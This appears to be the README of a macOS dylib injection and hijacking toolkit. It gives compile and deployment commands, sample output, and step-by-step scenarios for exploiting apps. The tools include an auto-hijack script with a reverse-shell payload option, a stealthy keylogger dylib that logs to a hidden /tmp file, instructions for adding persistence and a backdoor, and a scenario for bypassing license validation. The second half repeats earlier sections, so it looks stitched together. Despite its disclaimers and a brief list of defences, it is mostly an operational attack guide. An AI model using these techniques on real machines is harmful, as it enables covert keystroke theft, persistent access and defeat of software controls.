# Dylib Hijacking Toolkit

A comprehensive toolkit for researching, exploring, and demonstrating macOS dylib injection and hijacking techniques. This repository contains various tools and resources designed for security professionals, penetration testers, and researchers to understand and test the security implications of dynamic library loading on macOS systems.

> **IMPORTANT**: These tools are provided for educational and research purposes only. Use responsibly and only on systems you own or have explicit permission to test.

## Overview

Dylib injection and hijacking are powerful techniques that can be used to modify the behavior of macOS applications by loading custom code into their process space. This toolkit provides a collection of tools to help you understand, identify, and exploit these techniques, as well as defend against them.

## Repository Contents

### Documentation

- **Detailed Notes**: Comprehensive documentation on dylib injection and hijacking techniques, including the underlying mechanics, Apple's security restrictions, and exploitation methodologies.
- **Vulnerable Apps List**: Curated list of applications known to be vulnerable to dylib hijacking techniques.

### Core Tools

1. **Basic Dylib Injection Template**: A template for creating injectable dylibs with logging capabilities.
2. **Dylib Hijacking Template**: A template for creating dylibs that can hijack and re-export symbols from original libraries.
3. **Dylib Hijacking Scanner**: A tool to scan applications for potential dylib hijacking vulnerabilities.
4. **AMFI Flags Checker**: A utility to analyze AppleMobileFileIntegrity restrictions applied to binaries.
5. **Automatic Dylib Hijacking Script**: A tool that automates the process of creating and deploying hijacking dylibs.
6. **dlopen Hijacking Script**: A specialized tool for identifying and exploiting dlopen-based vulnerabilities.
7. **Advanced Dylib Keylogger Template**: A demonstration of how dylib hijacking could be used for keylogging (for educational purposes).

## Installation

### System Requirements

- macOS 10.15 (Catalina) or newer
- Apple Silicon or Intel processor
- Xcode Command Line Tools
- Root privileges (for some tools)

### Dependencies

- GCC/Clang Compiler
- Bash shell
- Core macOS utilities (otool, codesign, etc.)

### Installation Steps

1. Clone this repository:
   ```bash
   git clone https://github.com/yourusername/dylib-hijacking-toolkit.git
   cd dylib-hijacking-toolkit
   ```

2. Make the scripts executable:
   ```bash
   chmod +x tools/*.sh
   ```

3. Compile the C tools:
   ```bash
   ./compile_tools.sh
   ```

## Tool Descriptions and Usage

### 1. Basic Dylib Injection Template
`templates/basic_dylib_template.c` provides a foundation for creating a simple dylib that can be injected into applications using DYLD_INSERT_LIBRARIES or other methods.

**Compilation:**
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation templates/basic_dylib_template.c -o injection.dylib
```

**Usage:**
```bash
DYLD_INSERT_LIBRARIES=./injection.dylib /path/to/target/application
```

**Expected Output:**
```
[+] Dylib injection successful at 2023-05-05 14:30:45
[+] Injected into process: /path/to/target/application (PID: 1234, Parent PID: 1233)
[+] Current user: UID=501, Effective UID=501
[+] Current working directory: /Users/username/Downloads
[+] PATH environment variable: /usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
[+] Initialization complete
```

**What to do with the output:**
- Verify the injection was successful
- Note the process information for further analysis
- Check the user context in which the code is running
- Examine environment variables available to the process

### 2. Dylib Hijacking Template
`templates/dylib_hijacking_template.c` demonstrates how to create a "hijacking" dylib that re-exports symbols from an original library while adding malicious functionality.

**Compilation:**
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation templates/dylib_hijacking_template.c -Wl,-reexport_library,/path/to/original.dylib -o hijack.dylib

# After compilation, fix the path:
install_name_tool -change @rpath/original.dylib /absolute/path/to/original.dylib hijack.dylib
```

**Expected Output:**
When the target application loads the hijacked dylib, you should see log entries in both the console output and system logs:
```
[+] Dylib hijack successful in /Applications/Target.app/Contents/MacOS/Target (PID: 1234)
[+] Running with UID=501, EUID=501
```

**What to do with the output:**
- Verify the dylib was loaded by the target application
- Check if any errors occurred during symbol re-exporting
- Modify the template to add your own functionality
- Use `sudo log stream` to monitor the syslog output in real-time

### 3. Dylib Hijacking Scanner
`tools/dylib_finder.sh` scans applications for potential dylib hijacking vulnerabilities.

**Usage:**
```bash
./tools/dylib_finder.sh /Applications
```

**Example Output:**
```
[+] Starting scan...
[+] Found 156 Mach-O binaries

Analyzing: /Applications/Example.app/Contents/MacOS/Example
[+] Checking for weak dylibs in Example
[-] /usr/lib/libMissing.dylib (DOES NOT EXIST - POTENTIAL HIJACK TARGET)
[+] Checking for @rpath dependencies in Example
[!] RPATH search order:
    @loader_path/../Frameworks -> /Applications/Example.app/Contents/Frameworks
    @executable_path/../Frameworks -> /Applications/Example.app/Contents/Frameworks
[!] Potential RPATH hijacking: First search path doesn't contain required dylibs
[+] Checking code signing for Example
[-] Has hardened runtime
[!] No library validation - potential target

[+] Analysis complete!
[+] Found 3 high-value hijacking opportunities
[+] Results saved to: dlopen_hijack_report_20230505_143045.txt
```

**What to do with the results:**
1. Examine the report file for detailed findings
2. Focus on applications with:
   - Missing weak dylibs
   - RPATH ordering vulnerabilities
   - No hardened runtime or library validation
3. Use the "Automatic Dylib Hijacking Script" to create exploit dylibs for these targets
4. Verify vulnerabilities manually before reporting

### 4. AMFI Flags Checker
`tools/amfi_checker.c` analyzes the AppleMobileFileIntegrity restrictions applied to binaries.

**Compilation:**
```bash
gcc -o amfi_checker tools/amfi_checker.c -framework Security
```

**Usage:**
```bash
./amfi_checker /path/to/binary
```

**Example Output:**
```
===============================================
     AMFI Restrictions Analysis Tool
===============================================

[*] Analyzing AMFI restrictions for: /Applications/Example.app/Contents/MacOS/Example

[*] Binary characteristics:
  No __RESTRICT segment
  Has hardened runtime (CS_RUNTIME)
  No library validation
  Has disable-library-validation entitlement

[*] Attempting to query AMFI for dyld policy flags...

[*] AMFI flags result: 0xdf (return code: 0)

[*] Detailed AMFI restrictions analysis:
  [+] Allow @paths                                  : ALLOWED
  [+] Allow path environment variables              : ALLOWED
  [+] Allow custom shared cache                     : ALLOWED
  [+] Allow fallback paths                          : ALLOWED
  [+] Allow print environment variables             : ALLOWED
  [+] Allow failed library insertion                : ALLOWED
  [+] Allow library interposing                     : ALLOWED
  [+] Allow embedded variables                      : RESTRICTED

[*] Environment variables injection: POSSIBLE

[*] Injection command example:
  DYLD_INSERT_LIBRARIES=/path/to/malicious.dylib /Applications/Example.app/Contents/MacOS/Example

Example command to check CS flags for a running process:
  csops -status <pid>

===============================================
```

**How to interpret the results:**
1. Check if the binary has any built-in restrictions (RESTRICT segment, hardened runtime)
2. Review the AMFI flags to determine if environment variables can be used for injection
3. Note which specific environment variables are allowed
4. If environment variable injection is POSSIBLE, use the suggested injection command
5. For running processes, use the csops command to check code signing flags

### 5. Automatic Dylib Hijacking Script
`tools/auto_hijack.sh` automates the process of creating and deploying a hijacking dylib.

**Usage:**
```bash
./tools/auto_hijack.sh <target_binary> <dylib_to_hijack> <output_dylib> [payload_option]
```

**Example Command:**
```bash
./tools/auto_hijack.sh /Applications/Example.app/Contents/MacOS/Example "@rpath/libExample.dylib" ./malicious.dylib 1
```

**Expected Output:**
```
===============================================
     Automatic Dylib Hijacking Script
===============================================
[+] Creating hijacking dylib for /Applications/Example.app/Contents/MacOS/Example
[+] Target dylib: @rpath/libExample.dylib
[+] Extracting version info...
[+] Found version info: current=1.0.0, compatibility=1.0.0
[+] Resolving @rpath in @rpath/libExample.dylib
[+] Dylib name: libExample.dylib
[+] Checking rpaths:
    Checking /Applications/Example.app/Contents/Frameworks/libExample.dylib
[+] Found original dylib at: /Applications/Example.app/Contents/Frameworks/libExample.dylib
[+] Creating payload for option 1
[+] Creating source code at /var/folders/zz/zyxvpxvq6cz_n67653jq4drr000gn/T/tmp.XXXXXXXX/hijack.c
[+] Compiling hijacking dylib
[+] Re-exporting symbols from /Applications/Example.app/Contents/Frameworks/libExample.dylib
[+] Compile command: gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /var/folders/zz/zyxvpxvq6cz_n67653jq4drr000gn/T/tmp.XXXXXXXX/hijack.c -o ./malicious.dylib -Wl,-reexport_library,/Applications/Example.app/Contents/Frameworks/libExample.dylib
[+] Fixing path references in the compiled dylib
[+] Hijacking dylib created successfully: ./malicious.dylib
[!] To complete the hijack, copy the dylib to:
    /Applications/Example.app/Contents/Frameworks/libExample.dylib
[!] Command to copy the dylib:
    cp "./malicious.dylib" "/Applications/Example.app/Contents/Frameworks/libExample.dylib"
Would you like to deploy the dylib to the target location? (y/n): y
[+] Copying dylib to target location...
[+] Dylib deployed successfully!
[+] To test the hijack, run:
    /Applications/Example.app/Contents/MacOS/Example
===============================================
     Dylib Hijacking Setup Complete
===============================================
```

**What to do after running:**
1. If you chose to deploy the dylib, launch the target application to test the hijack
2. Check for log messages in the system log: `sudo log stream | grep "Dylib hijack"`
3. Look for the log file at `/tmp/dylib_hijack.log`
4. For reverse shell payloads, set up a listener on the specified port before running the target app
5. For custom script payloads, ensure your script is executable and properly configured

### 6. dlopen Hijacking Script
`tools/dlopen_hijack.sh` helps identify and exploit dlopen hijacking opportunities.

**Usage:**
```bash
sudo ./tools/dlopen_hijack.sh <path_to_application> [args]
```

**Example:**
```bash
sudo ./tools/dlopen_hijack.sh /Applications/Example.app/Contents/MacOS/Example
```

**Expected Output:**
```
=================================================
        dlopen Hijacking Script
=================================================
[+] Target application: /Applications/Example.app/Contents/MacOS/Example
[+] Setting up monitoring environment...
[!] Enter a library name pattern to filter (e.g., 'lib' or '.dylib'), or leave blank for all:
[!] Using default pattern: .dylib
[+] Starting filesystem monitoring...
[+] Launching application: /Applications/Example.app/Contents/MacOS/Example
[!] Use the application normally to trigger dlopen calls, then exit.
[!] Press Ctrl+C in this terminal when done...

[+] Stopping monitoring...
[+] Processing results...
[+] Checking for dlopen hijacking opportunities...
[!] High-value target: /usr/local/lib/libexample.dylib
    File doesn't exist but directory is writable!
[!] Missing file: /Applications/Example.app/Contents/Resources/plugins/libplugin.dylib
[+] Analysis complete!
[+] Found 1 high-value hijacking opportunities
[+] Results saved to: dlopen_hijack_report_20230505_143045.txt
[+] Exploit templates created in: /var/folders/zz/zyxvpxvq6cz_n67653jq4drr000gn/T/tmp.XXXXXXXX/exploit_templates/
[!] Would you like to keep the exploit templates? (y/n): y
[+] Templates copied to: ./dlopen_exploit_templates_20230505_143045
```

**Next steps with the results:**
1. Review the detailed report to understand what libraries the application is trying to load
2. Examine the "high-value targets" - libraries that don't exist but could be created
3. Check the exploit templates generated for each potential target
4. Compile and deploy the exploit template for testing:
   ```bash
   cd dlopen_exploit_templates_20230505_143045
   gcc -dynamiclib -o "libexample.dylib" "libexample.dylib.c"
   sudo cp "libexample.dylib" "/usr/local/lib/libexample.dylib"
   ```
5. Run the target application again to verify the hijack was successful
6. Check for the proof file at `/tmp/dlopen_hijack_proof.txt`

### 7. Advanced Dylib Keylogger Template
`templates/keylogger_dylib.c` demonstrates how an attacker might use dylib injection to implement a keylogger.

**Compilation:**
```bash
gcc -dynamiclib -framework Cocoa -framework Carbon templates/keylogger_dylib.c -o keylogger.dylib
```

**Injection:**
```bash
# Using environment variables (if not restricted):
DYLD_INSERT_LIBRARIES=./keylogger.dylib /Applications/Example.app/Contents/MacOS/Example

# Or via dylib hijacking (replace a library the app loads):
cp keylogger.dylib /path/to/hijacked/library.dylib
```

**Expected Behavior:**
- No visible output to the console (stealthy operation)
- Creates a log file at `/tmp/.keylog.txt`
- Logs all keystrokes while the application has focus
- Entries in system log viewable with: `sudo log stream | grep "Keylogger"`

**Analyzing the results:**
1. Check the log file: `cat /tmp/.keylog.txt`
2. Monitor system logs: `sudo log stream | grep "Keylogger"`
3. The keylogger rotates logs when they exceed 5MB
4. Backup logs are stored at `/tmp/.keylog.txt.<timestamp>`

> **IMPORTANT**: This template is provided ONLY to demonstrate the risks of dylib hijacking. Do not use it to capture keystrokes without explicit permission.

## Advanced Usage Scenarios

### Scenario 1: Finding and Exploiting a Weak Dylib Reference

**Step 1: Identify a vulnerable application**
```bash
./tools/dylib_finder.sh /Applications
```

**Step 2: Verify application restrictions**
```bash
./amfi_checker /Applications/VulnerableApp.app/Contents/MacOS/VulnerableApp
```

**Step 3: Generate and deploy a hijacking dylib**
```bash
./tools/auto_hijack.sh /Applications/VulnerableApp.app/Contents/MacOS/VulnerableApp \
  "/usr/lib/missing.dylib" ./malicious.dylib 1
```

**Step 4: Launch the application and verify the hijack**
```bash
/Applications/VulnerableApp.app/Contents/MacOS/VulnerableApp
sudo log stream | grep "hijack"
```

### Scenario 2: Exploiting dlopen for Persistence

**Step 1: Identify dlopen targets**
```bash
sudo ./tools/dlopen_hijack.sh /Applications/TargetApp.app/Contents/MacOS/TargetApp
```

**Step 2: Review and compile the exploit template**
```bash
cd dlopen_exploit_templates_*
gcc -dynamiclib -o "libtarget.dylib" "libtarget.dylib.c"
```

**Step 3: Modify the exploit to add persistence**
Edit libtarget.dylib.c to include code that:
- Creates a launch agent or daemon
- Establishes a backdoor connection
- Maintains access across reboots

**Step 4: Deploy and test**
```bash
sudo cp "libtarget.dylib" "/usr/local/lib/libtarget.dylib"
/Applications/TargetApp.app/Contents/MacOS/TargetApp
```

### Scenario 3: Bypassing Application Controls

**Step 1: Find an application with library validation disabled**
```bash
./tools/dylib_finder.sh /Applications | grep "disable-library-validation"
```

**Step 2: Create a dylib that hooks security functions**
Modify the dylib_hijacking_template.c to hook functions like:
- File access controls
- Network restrictions
- License validation

**Step 3: Deploy the hijacking dylib**
```bash
./tools/auto_hijack.sh /Applications/RestrictedApp.app/Contents/MacOS/RestrictedApp \
  "@rpath/libSecurity.dylib" ./bypass.dylib 3
```

## Troubleshooting

### Common Issues

#### 1. Dylib Not Being Loaded

**Symptoms:**
- No log entries from the injected dylib
- Application launches normally with no evidence of hijacking

**Possible Causes and Solutions:**

a) **Application has hardened runtime with library validation**
   - Check with amfi_checker: `./amfi_checker /path/to/application`
   - Look for "Has hardened runtime" and "Has library validation" in the output
   - Solution: Target applications without these protections, or with the disable-library-validation entitlement

b) **Incorrect dylib path or version**
   - Verify the exact path the application is searching for
   - Confirm compatibility and current version numbers match
   - Solution: Use `otool -l` to get exact version requirements and correct your dylib

c) **Permission issues**
   - Check if you have write permissions to the target location
   - Solution: Use `sudo` when copying the dylib to protected locations

d) **SIP protection**
   - System Integrity Protection prevents writing to system directories
   - Solution: Target applications in user-writable locations, not system paths

#### 2. Compilation Errors

**Common Error:** "Framework not found"
```
ld: framework not found Cocoa
```

**Solution:**
- Install Xcode Command Line Tools: `xcode-select --install`
- Specify the framework path: `-F /System/Library/Frameworks`

**Common Error:** "Undefined symbols"
```
Undefined symbols for architecture arm64: "_OBJC_CLASS_$_NSObject"
```

**Solution:**
- Add Objective-C runtime: `-framework Foundation`
- Ensure you're building for the correct architecture: `-arch arm64` or `-arch x86_64`

#### 3. Scanner Not Finding Vulnerabilities

**Issue:** No vulnerable applications reported

**Solutions:**
- Scan more applications: `./tools/dylib_finder.sh /Applications /usr/local/bin`
- Try applications in the curated list: See `docs/vulnerable_apps.md`
- Check third-party applications, which tend to have fewer security measures

#### 4. dlopen Monitoring Not Working

**Issue:** No filesystem events captured

**Solutions:**
- Ensure you're running with sudo: `sudo ./tools/dlopen_hijack.sh`
- Try a more generic filter pattern: Leave the pattern blank to catch all file operations
- Interact more with the application to trigger library loading
- Check if SIP is restricting fs_usage: Partially disable SIP or use a VM

### Getting Advanced Help

If you encounter issues beyond the scope of this troubleshooting guide:

1. Check the detailed notes in the `docs/` directory
2. Look for similar issues in the repository's issue tracker
3. Enable debug mode for more verbose output:
   ```bash
   DEBUG=1 ./tools/auto_hijack.sh ...
   ```
4. Use macOS's built-in tools for investigation:
   - `dtruss` for system call tracing (requires SIP disabled)
   - `fs_usage` for filesystem operations
   - `nm` to inspect symbol tables
   - `otool` for detailed Mach-O analysis

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer

The tools and information provided in this repository are for educational and research purposes only. The authors are not responsible for any misuse or damage caused by these tools. Always use them responsibly and only on systems you own or have explicit permission to test.


### 1. Basic Dylib Injection Template
`basic_dylib_template.c` provides a foundation for creating a simple dylib that can be injected into applications using DYLD_INSERT_LIBRARIES or other methods. It includes logging functionality and demonstrates the core constructor/destructor pattern used in dylib injection.

**Compilation:**
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation basic_dylib_template.c -o injection.dylib
```

**Usage:**
```bash
DYLD_INSERT_LIBRARIES=./injection.dylib /path/to/target/application
```

### 2. Dylib Hijacking Template
`dylib_hijacking_template.c` demonstrates how to create a "hijacking" dylib that re-exports symbols from an original library while adding malicious functionality. This is useful for exploiting applications that load dylibs using relative paths or weak references.

**Compilation:**
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation dylib_hijacking_template.c -Wl,-reexport_library,/path/to/original.dylib -o hijack.dylib

# After compilation, fix the path:
install_name_tool -change @rpath/original.dylib /absolute/path/to/original.dylib hijack.dylib
```

### 3. Dylib Hijacking Scanner
`dylib_finder.sh` is a script that scans applications for potential dylib hijacking vulnerabilities by identifying:
- Binaries with LC_LOAD_WEAK_DYLIB commands pointing to non-existent dylibs
- Binaries with @rpath dependencies where search order can be exploited
- Code signing restrictions that may prevent exploitation

**Usage:**
```bash
./dylib_finder.sh /Applications
```

### 4. AMFI Flags Checker
`amfi_checker.c` is a tool that analyzes the AppleMobileFileIntegrity restrictions applied to binaries. It helps determine if a binary is vulnerable to environment variable-based injection techniques by checking the AMFI flags and code signing properties.

**Compilation:**
```bash
gcc -o amfi_checker amfi_checker.c -framework Security
```

**Usage:**
```bash
./amfi_checker /path/to/binary
```

### 5. Automatic Dylib Hijacking Script
`auto_hijack.sh` automates the process of creating and deploying a hijacking dylib for a specified target binary and dylib path. It includes several payload options and handles version matching and path resolution automatically.

**Usage:**
```bash
./auto_hijack.sh <target_binary> <dylib_to_hijack> <output_dylib> [payload_option]

# Payload options:
# 1 - Simple logging payload (default)
# 2 - Create reverse shell
# 3 - Run custom script
```

### 6. dlopen Hijacking Script
`dlopen_hijack.sh` helps identify and exploit dlopen hijacking opportunities by monitoring the file system calls made by an application when using dlopen. It identifies libraries that could be hijacked and generates exploit templates.

**Usage:**
```bash
sudo ./dlopen_hijack.sh <path_to_application> [args]
```

### 7. Advanced Dylib Keylogger Template
`keylogger_dylib.c` demonstrates how an attacker might use dylib injection to implement a keylogger on macOS. This is included for educational purposes to show the potential security implications of dylib hijacking.

**Compilation:**
```bash
gcc -dynamiclib -framework Cocoa -framework Carbon keylogger_dylib.c -o keylogger.dylib
```

## Usage Examples

### Identifying Vulnerable Applications

```bash
# Scan Applications folder for vulnerabilities
./dylib_finder.sh /Applications

# Check if a specific application is restricted by AMFI
./amfi_checker /Applications/SomeApp.app/Contents/MacOS/SomeApp
```

### Exploiting a Vulnerable Application

```bash
# Create a hijacking dylib automatically
./auto_hijack.sh /Applications/VulnerableApp.app/Contents/MacOS/VulnerableApp @rpath/LibraryToHijack.dylib ./malicious.dylib

# Monitor dlopen calls in an application
sudo ./dlopen_hijack.sh /Applications/VulnerableApp.app/Contents/MacOS/VulnerableApp
```

### Testing Environment Variable Injection

```bash
# Create a basic injection dylib
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation basic_dylib_template.c -o injection.dylib

# Test injection on an application
DYLD_INSERT_LIBRARIES=./injection.dylib /Applications/SomeApp.app/Contents/MacOS/SomeApp
```

## Security Implications

Understanding dylib hijacking techniques is crucial for:

1. **Penetration Testing**: Identifying and exploiting weak points in software deployment
2. **Security Research**: Discovering new attack vectors in macOS applications
3. **Defensive Security**: Developing countermeasures against dylib-based attacks
4. **Application Hardening**: Building more secure applications by understanding attack methods

## Defensive Measures

To protect against dylib hijacking:

1. **Use Hardened Runtime**: Enable hardened runtime for your applications
2. **Enable Library Validation**: Require dylibs to be signed by the same team
3. **Use Absolute Paths**: Avoid relative paths when loading dylibs
4. **Sign All Binaries**: Code-sign all binaries and dylibs
5. **Use the __RESTRICT Segment**: Add a __RESTRICT segment to prevent environment variable injection

## Troubleshooting

### Common Issues

1. **Permission Denied**
   - Make sure you have appropriate permissions for the target applications
   - Some tools require root privileges to work properly

2. **Compilation Failures**
   - Ensure you have Xcode Command Line Tools installed
   - Check that the frameworks specified in compilation commands are available

3. **Injection Not Working**
   - The target application may have protections against dylib injection
   - Use the AMFI Flags Checker to verify if environment variables are restricted

4. **Scanner Not Finding Vulnerabilities**
   - Not all applications are vulnerable to dylib hijacking
   - Try scanning different applications or directories

### Getting Help

If you encounter issues, check the following:

1. Read the detailed notes on dylib injection restrictions
2. Examine the script outputs for error messages
3. Verify that your macOS version is supported
4. Check that all dependencies are properly installed

## Contributing

Contributions to this toolkit are welcome! If you have improvements, bug fixes, or new tools to add, please:

1. Fork the repository
2. Create a new branch for your feature
3. Add your changes
4. Submit a pull request

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer

The tools and information provided in this repository are for educational and research purposes only. The authors are not responsible for any misuse or damage caused by these tools. Always use them responsibly and only on systems you own or have explicit permission to test.